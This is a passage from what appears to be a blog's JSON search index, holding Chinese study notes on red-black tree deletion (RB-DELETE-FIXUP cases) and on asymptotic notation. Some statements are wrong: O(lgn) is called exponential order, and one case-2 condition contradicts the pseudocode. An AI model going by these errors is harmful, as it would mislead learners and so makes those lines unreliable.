先让y指向z的后继，此时的y指向的结点就是要用来代替z的位置的结点，并记录y原来的颜色，然后让x指向y的右孩子(因为y是z的后继所以y是没有左孩子的，但是右孩子也可能是T.nil)，紧接进入13到17行，判断y是不是z的孩子结点，如果是就让x的父结点指向y(此时的x有可能是T.nil但是依旧这么做)，如果不是那就让y的右孩子代替y的位置，而y则把原来z的右孩子作为自己新的右孩子。此时判断结束，就用y代替了z的位置，并且把z的颜色赋值给了y。 最后，判断y原来的颜色是否为黑，若是则进入RB-DELETE-FIXUP修复被破坏的红黑树性质。\n对y和x的总结：\n z只有一个结点的时候，y指向被删除的z，而x指向了z的孩子，并且代替了z位置。 z有两个结点的时候，y指向了z的后继，也就是代替了z位置的结点，x则指向了z的后继的右孩子，也就是代替了z的后继位置的结点。 所以x永远指向了y原来的位置，而y有可能是被删除的结点也可能是移动的结点。  这个函数与TREE-DELETE类似，而主要不同在于我们需要记录y原来的颜色和x的踪迹来解决红黑树性质可能被破坏的问题。\n然后我们讨论一下为何只有y是黑色的时候会破坏红黑树性质： 首先，若y是红色的话，红黑树性质是必定保持的，因为：\n 红色结点的移动和删除不改变树的黑高 因为y是红色的，当y是z的时候，显然不会出现红结点相邻，当y代替了z的位置时，无论y是否z的孩子结点，都不会出现红结点相邻。同时，若y是红色，则x必定是黑色的，所以代替了y的位置的x不会使两个红结点相邻。 若y是红色，y不可能是根结点，所以根结点依然是黑色。  若y是黑色，那有可能出现3个问题：\n y是根结点且y的一个红色孩子(x)成为了新的根结点。 若x和x.p(也就是原来的y.p)都是红的，那就违反了性质4 移动y使得之前包含y的简单路径黑结点个数减少1，因此，原来y的祖先都不满足性质5。 为了修复这些问题，就是x视为还有一重额外的黑色，所以x的颜色就变成了红黑色(color属性为RED)或双重黑色(color属性为黑)。因此就要RB-DELETE-FIXUP登场了  分析修复过程 RB-DELETE-FIXUP(T,x) while x ≠ T.root and x.color == BLACK if x == x.p.left ω = x.p.right if ω.color == RED ω.color = BLACK\t// 情况1 x.p.color = RED\t// 情况1 LEFT-ROTATE(T,x.p)\t// 情况1 ω = x.p.right\t// 情况1 if ω.left.color == BLACK and ω.right.color == BLACK ω.color = RED\t// 情况2 x = x.p\t// 情况2 else if ω.right.color == BLACK ω.left.color = BLACK\t// 情况3 w.color = RED\t// 情况3 RIGHT-ROTATE(T,ω)\t// 情况3 ω = x.p.right\t// 情况3 ω.color = x.p.color\t// 情况4 x.p.color = BLACK\t// 情况4 ω.right.color = BLACK\t// 情况4 LEFT-ROTATE(T,x.p)\t// 情况4 x = T.root\t// 情况4 else (same as then clause with \u0026quot;right\u0026quot; and \u0026quot;left\u0026quot; exchanged) x.color = BLACK 分析代码：\n首先，循环成立的条件是x不为root且x的颜色为黑色(双重黑色)，代码中x是左孩子与右孩子的代码是对称的所以只写出x是左孩子的部分。\n先让ω指向x的兄弟结点。 若ω颜色为红，则符合情况1，先把ω着色为黑，x父节点着色为红，然后对x的父结点执行左旋，交换了ω与父结点在树中的位置。然后在循环中继续。 若ω左孩子为黑色而右孩子为红色则进入情况2，把ω着色为红，x指向x的父节点。否则判断ω右孩子是否为黑色，若是，进入情况3然后再进入情况4，不然就直接进入情况4。 情况3下先把ω左孩子着色为黑，ω着色为红，右旋ω，然后把ω再重新指向x的兄弟结点。 情况4中先把ω着色成和父结点一样的颜色，然后把父结点着色为黑，ω的右孩子着色为黑，左旋x的父结点，把x指向根结点，循环结束，把x着色为黑(一重黑色)。\n因为有四种情况，所以我们有以下的对应图： 独立分析各种情况前，我们可以发现每种情况中，从子树的根(包括根自己)到每课子树(图中的α，β……)之间的黑结点个数(加上x的额外黑色)没有被改变，因此，性质5是否被破坏是不受这个修复过程影响的。\n情况1：x的右兄弟ω结点是红的。 那么x的父结点必然是黑的。所以我们把ω和父结点颜色交换以后对父结点左旋，ω重新指向x的右兄弟结点，所以ω现在是黑色的，以下情况ω都是黑色的。此时由情况1进入情况2、3、4中的一种。\n情况2：ω的孩子均为黑。 因为ω也是黑的，所以我们把ω和x去掉一层黑色，x就只有一重黑色而ω是红的，然后x指向其父结点，使得x.p增加了一层黑色，以此来重复while循环。注意，若是由情况1进入情况2，那么此时的x是红黑色，循环终止。\n情况3：ω左孩子为红，右孩子为黑。 那么把ω和左孩子交换颜色然后对ω右旋，ω重新指向x的右兄弟结点。这么做没有违反任何性质又进入了情况4。\n情况4：ω的右孩子是红。 把ω和父结点交换颜色，并把ω的右孩子设置为黑色，对x的父结点左旋，这样去掉了x的一重黑色，使得x变成一重黑色，然后把x指向root来结束循环。\n最后循环结束，把x设置为黑。\n分析 不调用RB-DELETE-FIXUP的时间为O(lgn)。在RB-DELETE-FIXUP中，情况1、3、4在常数次的颜色改变和最多3次的旋转后就终止循环，而情况2会把指针上移最多O(lgn)次且不进行任何旋转。所以，RB-DELETE-FIXUP要花费O(lgn)的时间，所以RB-DELETE运行总时间为O(lgn)\n","date":"2018-03-18T16:40:54Z","permalink":"https://example.com/p/red-black-tree/","title":"红黑树"},{"content":"学习《算法导论》的时候用到的几个渐进符号的定义了解过，但是总是忘记准确定义又要回去翻书，简略做下笔记以便查询\n渐进确界 Θ(theta) f(n) = Θ(g(n)) 表示存在正常数$c_1$， $c_2$，与$n_0$使得，对于任意n \u0026gt; $n_0$， 0 ≤ $c_1$g(n) ≤ f(n) ≤ $c_2$g(n) 由定义可知，这里的等号并不是对称的而是包含关系，实际上我们可以说f(n) ∈ Θ(g(n))，同时要求f(n)是渐进非负的，也就是说f(n)在n达到一定规模的大小后保持非负数。\n渐进上界 O(big-oh) f(n) = O(g(n)) 表示存在正常数c与$n_0$使得，对于任意n \u0026gt; $n_0$， 0 ≤ f(n) ≤ cg(n)\nO确定的是渐进上界，所以对于类似 $\\frac12n^2 - 3n$，我们可以说 $\\frac12n^2 - 3n$ = O($n^2$)，也可以说 $\\frac12n^2 - 3n$ = O($n^3$)，但是第一种情况更加精确。 O(1)表示常数阶的时间复杂度，O(lgn)表示指数阶，以此类推。\n渐进下界 Ω(big-omege) f(n) = Ω(g(n)) 表示存在正常数c与$n_0$使得，对于任意n \u0026gt; $n_0$， 0 ≤ cg(n) ≤ f(n)\n以上三种符号的图像： 非渐进紧确上下界 o(little-oh)与ω(little-omege) f(n) = o(g(n)) 表示对于任意常数c \u0026gt; 0，存在某常数$n_0$\u0026gt;0使得，对于任意n \u0026gt; $n_0$， 0 ≤ f(n) \u0026lt; cg(n) 例如：2n = o($n^2$) 但 $2n^2$ ≠ $o(n^2)$\n ω对于Ω就相当于o对于O，与上述定义类似。 f(n) = ω(g(n)) 表示对于任意常数c \u0026gt; 0，存在某常数$n_0$\u0026gt;0使得，对于任意n \u0026gt; $n_0$， 0 ≤ cg(n) \u0026lt; f(n)\n","date":"2018-03-09T16:46:27Z","permalink":"https://example.com/p/nation-note/","title":"渐进符号笔记"}]